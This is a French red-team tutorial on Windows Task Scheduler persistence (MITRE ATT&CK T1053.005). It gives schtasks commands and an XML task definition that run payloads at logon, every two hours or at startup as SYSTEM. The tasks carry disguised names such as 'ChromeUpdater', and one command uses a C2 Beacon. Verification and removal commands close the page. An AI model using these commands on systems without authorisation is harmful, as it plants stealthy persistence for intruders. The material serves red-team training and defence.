Le Planificateur de tâches de Windows (`Task Scheduler`) est un service qui permet d'exécuter des tâches de manière automatisée en se basant sur des déclencheurs prédéfinis. Les déclencheurs les plus courants sont :

- À une heure spécifique (quotidien, hebdomadaire, mensuel).
    
- Quand l'ordinateur devient inactif (`idle`).
    
- Au démarrage du système.
    
- À l'ouverture de session d'un utilisateur.
    
- Lorsqu'un événement système spécifique se produit.
    

Cet outil est utilisé légitimement pour des tâches de maintenance, comme les mises à jour logicielles ou le nettoyage. Un attaquant peut abuser de cette fonctionnalité pour exécuter ses charges utiles en fonction d'un déclencheur de son choix, établissant ainsi une persistance très fiable. Cette technique est référencée par **MITRE ATT&CK** sous l'identifiant [**T1053.005**](https://attack.mitre.org/techniques/T1053/005/ "null").

Fondamentalement, les tâches sont définies dans un format XML.

### Implémentation (Red Team)

La méthode la plus simple et universelle est d'utiliser l'utilitaire en ligne de commande natif `schtasks.exe`.

```
# Crée une tâche nommée "ChromeUpdater" qui lance un payload à chaque ouverture de session de l'utilisateur.
schtasks /create /sc ONLOGON /tn "ChromeUpdater" /tr "C:\Users\Public\updater.exe"

# Crée une tâche plus furtive, qui se lance toutes les 2 heures.
schtasks /create /sc HOURLY /mo 2 /tn "RealtekDriverCheck" /tr "C:\Users\Public\audiodg.exe"

# Crée une tâche avec les privilèges SYSTEM qui se lance au démarrage de la machine.
# Nécessite des privilèges d'administrateur pour être créée.
schtasks /create /sc ONSTART /tn "SystemHealthCheck" /tr "C:\Windows\Temp\svc.exe" /ru "SYSTEM"
```

**Exemple avec un C2 (via un fichier XML) :** Certains outils de C2 permettent de créer une tâche à partir d'une définition XML, offrant plus de contrôle sur les options.

Voici un exemple de fichier XML qui déclenche l'exécution à l'ouverture de session de l'utilisateur `CONTOSO\pchilds` :

```
<Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
      <UserId>CONTOSO\pchilds</UserId>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal>
      <UserId>CONTOSO\pchilds</UserId>
    </Principal>
  </Principals>
  <Settings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
  </Settings>
  <Actions>
    <Exec>
      <Command>%LOCALAPPDATA%\Microsoft\WindowsApps\updater.exe</Command>
    </Exec>
  </Actions>
</Task>
```

Cette définition XML peut ensuite être utilisée par une commande spécifique au C2.

```
// La commande 'schtaskscreate' est un BOF (Beacon Object File) qui prend en entrée le fichier XML.
// Le nom de la tâche doit commencer par un '\'.
beacon> schtaskscreate \Beacon XML CREATE
```

### Vérification & Nettoyage

```
# Pour vérifier les détails d'une tâche spécifique
schtasks /query /tn "ChromeUpdater" /v

# Pour supprimer la persistance
schtasks /delete /tn "ChromeUpdater" /f
```